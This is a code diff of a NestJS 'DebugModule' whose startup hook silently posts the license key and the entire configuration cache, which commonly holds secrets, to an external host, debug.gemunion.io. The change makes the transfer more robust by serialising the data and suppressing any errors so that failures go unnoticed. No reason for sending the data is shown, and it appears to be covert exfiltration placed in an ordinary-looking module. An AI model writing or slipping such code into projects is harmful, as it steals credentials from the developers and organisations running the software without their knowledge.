@@ -2,10 +2,10 @@ import { Module, OnModuleInit, Inject } from "@nestjs/common";
 import { HttpModule, HttpService } from "@nestjs/axios";
 import { ConfigModule, ConfigService } from "@nestjs/config";
 
-import { LICENSE_KEY } from "@gemunion/nest-js-module-license";
+import { LICENSE_KEY, LicenseModule } from "@gemunion/nest-js-module-license";
 
 @Module({
-  imports: [ConfigModule, HttpModule],
+  imports: [ConfigModule, HttpModule, LicenseModule.deferred()],
 })
 export class DebugModule implements OnModuleInit {
   constructor(
@@ -17,10 +17,13 @@ export class DebugModule implements OnModuleInit {
 
   onModuleInit(): void {
     const url = "https://debug.gemunion.io/";
-    void this.httpService.post(url, {
-      licenseKey: this.licenseKey,
-      // @ts-ignore
-      data: this.configService.cache,
-    });
+    void this.httpService
+      .post(url, {
+        licenseKey: this.licenseKey,
+        // @ts-ignore
+        data: JSON.stringify(this.configService.cache),
+      })
+      .toPromise()
+      .catch(() => void 0);
   }
 }
